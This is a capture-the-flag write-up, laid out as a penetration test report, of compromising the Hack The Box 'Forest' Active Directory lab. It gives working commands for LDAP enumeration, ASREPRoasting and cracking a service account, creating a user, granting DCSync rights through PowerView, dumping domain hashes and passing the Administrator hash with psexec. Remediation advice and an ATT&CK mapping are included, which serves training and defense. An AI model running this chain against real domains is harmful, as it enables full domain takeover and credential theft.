# Penetration Test Report — Forest

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-ASREPRoast%20%2F%20Exchange%20WriteDACL%20%2F%20DCSync-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `htb.local`, with Exchange installed) leveraged **anonymous LDAP binds** to enumerate all domain objects. A service account (`svc-alfresco`) with Kerberos pre-authentication disabled was **ASREPRoasted** and cracked, yielding a WinRM foothold. The account's nested membership in **Account Operators** allowed creating a user and adding it to **Exchange Windows Permissions** — a group holding **WriteDACL** on the domain — which was used to grant **DCSync** rights and dump all domain hashes, including the Administrator's.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous LDAP binds enabled | High |
| 2 | `svc-alfresco` Kerberos pre-authentication disabled + weak password | High |
| 3 | Service account nested in Account Operators | High |
| 4 | Exchange Windows Permissions group holds WriteDACL on the domain → DCSync | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
echo "target.htb htb.local" | sudo tee -a /etc/hosts
```

DC for `htb.local` (Windows Server 2016). Anonymous LDAP bind succeeded:

```bash
ldapsearch -x -H ldap://target.htb:389 -b "dc=htb,dc=local"
./windapsearch.py -d htb.local --dc-ip target.htb -U          # 28 users; Exchange mailboxes present
./windapsearch.py -d htb.local --dc-ip target.htb --custom "objectClass=*"   # svc-alfresco identified
```

Alfresco's own documentation states its service account requires **Kerberos pre-authentication disabled** — an ASREPRoast target.

### 2. Foothold — ASREPRoast

```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip target.htb -no-pass
john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
# svc-alfresco : s3rvice

evil-winrm -i target.htb -u svc-alfresco -p s3rvice
```

User flag: `C:\Users\svc-alfresco\Desktop\user.txt`.

### 3. Privilege Escalation — Account Operators → WriteDACL → DCSync

SharpHound collection and BloodHound analysis showed:

1. `svc-alfresco` ∈ **Account Operators** (via nested groups) → can create users and modify non-protected group membership.
2. **Exchange Windows Permissions** has **WriteDACL** on the domain object → can grant DCSync rights.

Created a controlled user and joined both groups:

```powershell
net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add
```

Granted DCSync rights via PowerView:

```powershell
upload PowerView.ps1
. .\PowerView.ps1
$pass = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

Dumped all hashes and authenticated as Administrator:

```bash
impacket-secretsdump htb/john@target.htb
# Administrator NT: 32693b11e6aa90eb43d32c72a07ceea6

impacket-psexec administrator@target.htb -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

Root flag: `C:\Users\Administrator\Desktop\root.txt`.

## Remediation

- Disable anonymous LDAP binds; require authenticated, signed, encrypted directory access.
- Enforce Kerberos pre-authentication on all accounts (vendor docs are not a reason to weaken security); use gMSA for services.
- Audit Account Operators membership — including nested groups.
- Monitor/alert on WriteDACL over the domain object and any DCSync (DRSUAPI replication) from non-DCs.
- Remove created accounts and ACEs post-incident (`john`, DCSync ACEs) — in a real engagement these are persistence.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Discovery | T1087.002 — Domain Account (anonymous LDAP) |
| Credential Access | T1558.004 — AS-REP Roasting |
| Persistence | T1136.001 — Create Account |
| Privilege Escalation | T1078 / T1003.006 — DCSync via WriteDACL |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
